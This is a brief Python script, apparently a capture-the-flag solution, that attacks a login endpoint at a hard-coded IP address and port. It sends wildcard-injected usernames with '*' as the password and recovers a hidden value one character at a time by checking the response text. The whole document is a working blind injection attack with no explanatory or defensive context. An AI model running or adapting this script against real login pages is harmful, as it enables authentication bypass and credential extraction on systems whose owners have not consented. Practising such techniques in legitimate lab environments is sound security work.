import string, requests

# char = [string.ascii_letters]
# symbols = [string.punctuation]
# number = [string.digits]
# list = [char, symbols, number]
url = 'http://144.126.206.60:30149/login'
myObject = {'username' : 'somevalue', 'password' : '*'}
result = ''

flag = 1

# print(char)

list = []

for char in string.ascii_letters:
    # print(char)
    list.append(char)

for symbols in string.punctuation:
    # print(symbols)
    list.append(symbols)

for numbers in string.digits:
    list.append(numbers)

print(list)
while flag == 1:
    flag = 0
    for i in list:
        myObject['username'] = result + i + '*'
        r = requests.post(url, data = myObject)
        r.raise_for_status()
        if 'No search result ' in r.text:
            result += i
            flag = 1
            print(result)
            break